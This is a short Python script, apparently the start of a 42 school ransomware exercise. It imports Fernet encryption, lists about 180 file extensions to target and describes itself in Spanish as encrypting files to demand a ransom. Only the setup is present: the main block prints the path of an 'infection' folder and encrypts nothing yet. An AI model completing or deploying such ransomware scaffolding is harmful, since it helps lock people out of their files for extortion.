from cryptography.fernet import Fernet
import sys, os
import os
import argparse

extensiones = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
                ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
                ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs",
                ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg",
                ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw",
                ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx",
                ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb",
                ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb",
                ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"] #


#url_root = https://www.42madrid.com

parser = argparse.ArgumentParser(description="Encriptar ficheros para pedir rescate !!Con dos cojones¡¡")
parser.add_argument("key", help="key para encriptar los ficheros")
parser.add_argument("-r", "--reverse", dest="reverse", action="store_true", help="Desencripta los ficheros utilizando la key.")
parser.add_argument("-s", "--silence", dest="silence", action="store_true", help="Silenciar los eventos de encriptado y desencriptado.")
parser.add_argument("-v", "--version", dest="version", action="store_true", help="version del programa")

params = parser.parse_args()


extension = ".ft"

if __name__ == "__main__":
    path_to_encrypt = os.getcwd() + "/infection"
    try:
       # items = os.listdir(path_to_encrypt)
        print(path_to_encrypt)            
    except:
        print ("No se encontraron ficheros para encryptar")
 
